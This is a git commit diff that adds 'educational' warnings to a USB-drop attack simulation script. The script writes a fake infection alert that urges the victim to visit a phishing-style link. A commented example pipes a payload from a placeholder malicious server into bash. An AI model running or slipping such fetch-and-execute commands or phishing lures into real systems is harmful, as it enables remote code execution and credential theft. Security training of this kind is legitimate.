1213af342b07ab5b22ad50a077306b67468b4838
InfosecSamurai <William.B.Shaw@proton.me>
2025-11-28 16:42:47 -0500

    Update usb_payload.sh

--- attacks/usb_drop/usb_payload.sh
+++ attacks/usb_drop/usb_payload.sh
@@ -1,8 +1,10 @@
 #!/bin/bash
 
 # Payload script that runs on a victim machine when USB is plugged in
+echo "===== USB ATTACK SIMULATION (EDUCATIONAL) ====="
 echo "You have been infected! Please click this link to resolve the issue: http://fake-login-page.com" > /home/victim/desktop/fake_alert.txt
 
-# Additional malicious commands can be added here
+# **Warning:** This script is for educational purposes only.
+# Additional malicious commands can be added here.
 # For example, downloading a payload from a remote server:
 # curl http://malicious-server.com/payload.sh | bash
